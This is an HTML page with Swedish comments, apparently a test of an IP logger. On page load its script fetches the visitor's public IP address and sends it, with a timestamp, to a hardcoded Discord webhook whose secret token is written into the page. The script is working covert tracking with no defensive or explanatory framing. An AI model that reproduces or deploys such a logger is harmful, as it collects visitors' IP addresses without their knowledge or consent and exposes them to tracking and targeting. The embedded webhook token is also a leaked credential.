<!DOCTYPE html>
<html>
<head>
    <title>IP Test</title>
</head>
<body>
    <h1>Testing IP Logger...</h1>
    <p>Check Discord in a few seconds.</p>
    
    <script>
        // DIN WEBHOOK - ÄNDRA HÄR
        const WEBHOOK = "https://discord.com/api/webhooks/1486791223199928608/wdF1JEPc9i0podmhHCs6QjqwaWUFux8kO2YYy11bFaEnJ264TVMRXGj1RXXBUrLv7";
        
        async function testLogger() {
            try {
                console.log("1. Startar logger...");
                
                // Hämta IP
                console.log("2. Hämtar IP...");
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const ip = data.ip;
                console.log("3. IP hämtad:", ip);
                
                // Skicka till Discord
                console.log("4. Skickar till Discord...");
                const response = await fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: `✅ **TEST FUNGERAR!**\nIP: ${ip}\nTid: ${new Date().toISOString()}`
                    })
                });
                
                console.log("5. Discord svarade med status:", response.status);
                
                if (response.status === 204) {
                    console.log("✅ Lyckades! Kolla Discord!");
                } else {
                    console.log("❌ Misslyckades. Status:", response.status);
                }
                
            } catch(error) {
                console.log("❌ FEL:", error.message);
            }
        }
        
        testLogger();
    </script>
</body>
</html>
